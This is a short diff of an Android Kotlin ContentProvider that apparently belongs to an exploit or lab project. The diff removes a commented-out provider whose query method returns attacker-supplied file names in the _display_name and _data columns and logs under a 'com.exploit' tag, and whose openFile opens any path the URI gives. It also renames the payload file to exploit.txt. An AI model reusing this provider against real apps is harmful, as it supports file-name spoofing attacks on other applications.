@@ -15,87 +15,9 @@ import java.nio.charset.StandardCharsets
 
 class MekatoProvider : ContentProvider() {
 
-/**    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
-        return 0
-    }
-
-    override fun getType(uri: Uri): String? {
-        return null
-    }
-
-    override fun insert(uri: Uri, values: ContentValues?): Uri? {
-        return null
-    }
-
-    override fun onCreate(): Boolean {
-        return false
-    }
-
-    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
-        Log.d("He llegado:", "esta es la URI $uri.toString()")
-        val path = uri.toString() // Obtiene la URI como una cadena.
-        val file = File(path)
-        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY)
-    }
-
-    override fun query(
-        uri: Uri,
-        projection: Array<String>?,
-        selection: String?,
-        selectionArgs: Array<String>?,
-        sortOrder: String?
-    ): Cursor? {
-        Log.d("Incoming Query:", uri.toString())
-        val matrixCursor = MatrixCursor(arrayOf("_display_name", "_size", "_data", "title", "mime_type"))
-
-        val isEncrypted = uri.getBooleanQueryParameter("enc", false)
-        val name = uri.getQueryParameter("name")
-        val size = uri.getQueryParameter("_size")
-
-        val str3 = if (isEncrypted) {
-            try {
-                URLEncoder.encode(name, StandardCharsets.UTF_8.toString())
-            } catch (e: UnsupportedEncodingException) {
-                e.printStackTrace()
-                ""
-            }
-        } else {
-            name
-        }
-
-        if (str3 == "null") {
-            matrixCursor.addRow(arrayOf(null, size, null, null, null))
-        } else {
-            matrixCursor.addRow(arrayOf(str3, size, str3, str3, "image/jpeg"))
-        }
-
-        if (projection != null) {
-            try {
-                matrixCursor.moveToFirst()
-                for (str4 in projection) {
-                    val columnIndex = matrixCursor.getColumnIndex(str4)
-                    Log.d("com.exploit", "Query for $str4, returning: ${matrixCursor.getString(columnIndex)}")
-                }
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }
-
-        return matrixCursor
-    }
-
-
-    override fun update(
-        uri: Uri, values: ContentValues?, selection: String?,
-        selectionArgs: Array<String>?
-    ): Int {
-        // Implementa la lógica para actualizar uno o más registros.
-        return 0
-    }
-}**/
     companion object {
         private const val AUTHORITY = "com.example.mekato"
-        private const val FILE_PATH = "payload.txt"
+        private const val FILE_PATH = "exploit.txt"
         private const val URI_CODE = 1
         private val uriMatcher = UriMatcher(UriMatcher.NO_MATCH)
 
